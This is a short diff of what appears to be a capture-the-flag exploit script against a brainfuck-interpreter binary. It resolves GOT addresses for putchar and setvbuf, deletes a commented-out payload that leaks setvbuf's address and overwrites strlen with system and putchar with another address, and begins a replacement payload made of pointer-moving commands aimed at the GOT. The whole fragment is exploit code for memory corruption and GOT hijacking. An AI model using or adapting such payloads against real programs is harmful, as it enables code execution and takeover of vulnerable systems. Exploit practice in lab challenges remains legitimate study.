@@ -13,14 +13,7 @@ putchar_got = elf.got['putchar']
 # strlen_got = elf.got['strlen']
 setvbuf_got = elf.got['setvbuf']
 
-# payload = ''
-# payload += '<'*(p_addr-setvbuf_got) # point to setvbuf_got
-# payload += '.'+'>'+'.'+'>'+'.'+'>'+'.'+'>'+ '<'*4 #leak setvbuf()
-# payload += '<'*(setvbuf_got-strlen_got)#point to strlen_got
-# payload += ','+'>'+','+'>'+','+'>'+','+'>' #change strlen() to system
-# payload += '>'*(putchar_got-(strlen_got+4))
-# payload += ','+'>'+','+'>'+','+'>'+','+'>' #change putchar() to val_addr
-# payload +='.'
+
 payload  = ''
 payload +=',>'*8+'<'*8
 payload += '<'*(p_addr-setvbuf_got) # point to setvbuf_got
